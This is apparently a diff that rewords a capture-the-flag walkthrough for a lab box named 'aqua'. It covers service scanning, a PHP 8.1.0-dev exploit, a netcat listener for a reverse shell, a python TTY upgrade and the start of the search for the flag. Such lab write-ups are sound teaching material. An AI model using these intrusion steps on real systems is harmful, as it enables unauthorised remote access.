@@ -19,13 +19,13 @@ PORT   STATE SERVICE VERSION
 [..]
 ```
 
-The output suggests that there are two open ports: an SSH and an HTTP server. The Apache HTTP server on port 80 appears to host a static website, which can be viewed in any web browser:
+The output suggests that there are two open ports: an SSH and an HTTP server. The Apache HTTP server on port 80 hosts a static website, which can be viewed in any web browser:
 
 ![website](img/01.png)
 
 ## 2. Exploitation / Remote code execution
 
-The next step is to exploit vulnerabilities in the exposed services. The first option that comes to mind is the PHP version `8.1.0-dev` which was identified by the `nmap` scan.
+The next step is to exploit vulnerabilities in the exposed services. One thing that comes to mind is the PHP version `8.1.0-dev`, which was identified by the `nmap` scan.
 
 A quick lookup with `searchsploit` shows an interesting exploit:
 
@@ -53,9 +53,9 @@ $ id
 uid=1(daemon) gid=1(daemon) groups=1(daemon)
 ```
 
-Cool! Looks like we can execute commands on the machine. The next step is to establish a reverse shell for an interactive experience. We can use this [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
+Cool! Looks like we can execute commands on the machine. Our next step is to establish a proper reverse shell. You can use this [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
 
-Establishing the reverse shell happens in two steps:
+Establishing a reverse shell requires two steps:
 
 1. Start a listener on your local Kali Linux machine on some port:  `nc -lnvp 4242`
 
@@ -65,7 +65,7 @@ Establishing the reverse shell happens in two steps:
    ```
    > Note that you need to provide the IP address of your Kali machine, which is `192.168.60.2`.
 
-As soon as the command in step 2 is executed, the listener from step 1 will show an incoming connection from `aqua`. You can now type shell commands that will be executed on the remote machine.
+As soon as the command in step 2 is executed, the listener from step 1 will show an incoming connection from `aqua`. You can now type shell commands that will get executed on the remote machine.
 
 For a more convenient experience, it is recommended to upgrade the connection to an [interactive TTY](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). To do this, simply execute `python3 -c 'import pty; pty.spawn("/bin/bash")'`:
 
@@ -76,9 +76,9 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 daemon@aqua:/$ 
 ```
 
-Now, there is a shell prompt and we can clearly see that we are logged in as the `daemon` user.
+Now, there is a pretty shell prompt and we can clearly see that we are logged in as the `daemon` user.
 
-Now we can explore the file system with a couple of `ls` and `cd` commands to locate the first flag:
+We can explore the file system with a couple of `ls`, `cd` and `cat` commands to obtain the first flag:
 
 ```bash
 daemon@aqua:/$ ls -al /home/aqua                                                    
